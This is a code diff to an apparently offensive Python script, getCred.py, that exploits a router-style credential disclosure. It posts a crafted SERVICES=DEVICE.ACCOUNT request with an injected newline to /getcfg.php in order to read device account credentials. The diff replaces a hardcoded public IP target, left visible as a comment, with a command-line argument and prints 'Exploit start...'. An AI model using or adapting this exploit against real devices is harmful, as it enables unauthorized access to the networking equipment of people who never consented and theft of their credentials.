@@ -7,6 +7,7 @@
 # En-Ze Wang
 
 import requests, os
+import sys
 from lxml import etree
 try:
     from urllib.parse import urljoin
@@ -15,7 +16,13 @@ except:
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
-url = 'http://58.237.50.225/'
+# url = 'http://58.237.50.225/'
+if len(sys.argv)<2:
+    print("Usage: python27 getCred.py http://127.0.0.1")
+    exit()
+else:
+    url = sys.argv[1]
+    
 print("Exploit start...")
 try:
     res = requests.post(urljoin(url,'/getcfg.php'),data={"SERVICES":"DEVICE.ACCOUNT","AUTHORIZED_GROUP":"1\n"})
